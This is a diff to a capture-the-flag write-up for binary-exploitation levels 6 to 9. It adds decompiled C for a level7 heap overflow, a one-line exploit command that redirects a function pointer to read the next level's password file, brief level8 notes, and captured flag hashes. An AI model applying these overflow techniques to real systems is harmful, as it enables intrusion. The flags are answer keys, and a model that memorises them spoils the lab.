@@ -246,13 +246,13 @@ void n(void) // 08048454
   return;
 }
 
-void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) // 08048468
+void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) // 08048468
 {
   puts("Nope");
   return;
 }
 
-void main(int argc,char **argv)
+void main(int argc, char **argv)
 {
   char *vuln;
   void **func;
@@ -266,8 +266,69 @@ void main(int argc,char **argv)
 }
 ```
 
+./level6 $(python /tmp/exploit.py)
+
+`f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
 # level7
 
+```c
+void m()
+{
+  time_t time;
+  
+  time = time((time_t *)0x0);
+  printf("%s - %d\n", c, time);
+  return;
+}
+
+int main(int argc, char **argv)
+
+{
+  char *str1;
+  void *ptr1;
+  char *str2;
+  FILE *flag;
+  
+  str1 = (char *)malloc(8);
+  *str1 = 1;
+
+  ptr1 = malloc(8);
+  str1[1] = ptr1;
+
+  str2 = (char *)malloc(8);
+  *str2 = 2;
+  ptr1 = malloc(8);
+  str2[1] = ptr1;
+
+  strcpy((char *)str1[1], argv[1]);
+  strcpy((char *)str2[1], argv[2]);
+
+  flag = fopen("/home/user/level8/.pass","r");
+
+  fgets(c, 68, flag);
+
+  puts("~~"); // 
+  return 0;
+}
+```
+Just like level5
+
+```bash
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
+```
+flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
+
 # level8
+
+Il faut :
+`auth    `
+
+car  if (auth[8] == 0) donc last char de auth != 0
+
+et faut pas que avant de faire login l'adresse de l'input == adresse du service
+mais qu'il y est eu au moins un service
+
+`c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
 
 # level9
